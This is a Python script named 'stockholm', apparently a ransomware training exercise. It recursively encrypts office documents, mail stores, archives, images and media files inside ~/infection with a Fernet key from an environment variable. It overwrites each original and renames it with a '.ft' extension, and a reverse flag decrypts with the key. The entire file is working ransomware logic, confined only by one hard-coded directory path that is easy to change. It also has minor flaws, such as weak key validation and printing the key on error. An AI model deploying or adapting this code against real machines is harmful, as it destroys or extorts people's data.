#!/usr/bin/python3

from cryptography.fernet import Fernet
from colorama import Fore
import argparse
import os

target_file_extensions = [".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg", ".eml", ".txt", \
                          ".csv", ".zip", ".rar", ".7z", ".pdf", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".mp3", ".mp4", ".avi", ".mkv"]

directory_path = os.path.join(os.path.expanduser("~"), "infection")

def parse_input():
    parser = argparse.ArgumentParser(prog='stockholm', usage='%(prog)s [options]', description='A script to encrypt files inside of a \'infection\' directory located inside the HOME directory')
    parser.add_argument('-r', '--reverse', type=str, help='Reverse the infection with the provided key.')
    parser.add_argument('-v', '--version', version='%(prog)s 1.0', help='Show the version of the program.', action='version')
    parser.add_argument('-s', '--silent', help='Prevents printing of the current file being encrypted', action='store_true')

    args = parser.parse_args()

    if args.reverse:
        if len(args.reverse) < 16:
            print("Error: The key must be at least 16 characters long.")
            exit(1)
    else:
        stockholm_key = os.getenv('STOCKHOLM_KEY')
        if not stockholm_key or len(stockholm_key) < 16:
            print("Error: The STOCKHOLM_KEY environment variable must be defined and at least 16 characters long.")
            print(stockholm_key)
            print(len(stockholm_key))
            exit(1)

    return args


def check_dir(silent):
    if os.path.exists(directory_path) and os.path.isdir(directory_path):
        if not silent:
            print(f"Found directory '{directory_path}':")
    else:
        print(f"{Fore.RED}Directory '{directory_path}' does not exist.{Fore.RESET}")
        exit(0)


def check_permissions(file_path, silent):
    can_read = os.access(file_path, os.R_OK)
    can_write = os.access(file_path, os.W_OK)

    if not can_read and not silent:
        print(Fore.RED + "No read permissions for file: " + Fore.WHITE + file_path + Fore.RESET)
    elif not can_write and not silent:
        print(Fore.RED + "No write permissions for file: " + Fore.WHITE + file_path + Fore.RESET)

    return can_read == False or can_write == False


def decrypt(key, silent):
    check_dir(silent)
    fernet = Fernet(key)
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = root+'/'+file_name
            if check_permissions(file_path, silent):
                continue

            base, ext = os.path.splitext(file_path)
            if ext != ".ft":
                if not silent:
                    print(Fore.LIGHTBLACK_EX + "Found unencrypted file: " + Fore.WHITE + file_name + Fore.LIGHTBLACK_EX + " skipping.." + Fore.RESET)
                continue
            original_name = base

            try:
                with open(file_path, 'rb') as encrypted_file:
                    encrypted_data = encrypted_file.read()
                decrypted_data = fernet.decrypt(encrypted_data)
                with open(file_path, 'wb') as decrypted_file:
                    decrypted_file.write(decrypted_data)
                os.rename(file_path, original_name)
                if not silent:
                    print(Fore.GREEN + "Decrypted file: " + Fore.WHITE + original_name + Fore.RESET)

            except:
                if not silent:
                    print(Fore.RED + "Unable to decrypt file: " + Fore.WHITE + file_name + Fore.RED + \
                          " file might not be encrypted or you are using the wrong key" + Fore.RESET)
                continue 


def encrypt(silent):
    check_dir(silent)
    key = os.getenv('STOCKHOLM_KEY')
    fernet = Fernet(key)
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = root+'/'+file_name
            if check_permissions(file_path, silent):
                continue

            base, ext = os.path.splitext(file_path)
            if ext in target_file_extensions:
                encrypted_file_path = file_path + ".ft"
                print(f"File: {root}/{file_path}")

                with open(file_path, 'rb') as file:
                    original_data = file.read()
                encrypted_data = fernet.encrypt(original_data)
                with open(file_path, 'wb') as encrypted_file:
                    encrypted_file.write(encrypted_data)
                os.rename(file_path, encrypted_file_path)

                if not silent:
                    print(Fore.GREEN + "Encrypted file: " + Fore.WHITE + file_name + Fore.RESET)
            else:
                if not silent:
                    print(Fore.LIGHTBLACK_EX + "Found file without the right extension: " + Fore.WHITE + file_name + Fore.LIGHTBLACK_EX + " skipping.." + Fore.RESET)


if __name__ == "__main__":
    args = parse_input()
    if args.reverse:
        decrypt(args.reverse, args.silent)
    else:
        encrypt(args.silent)
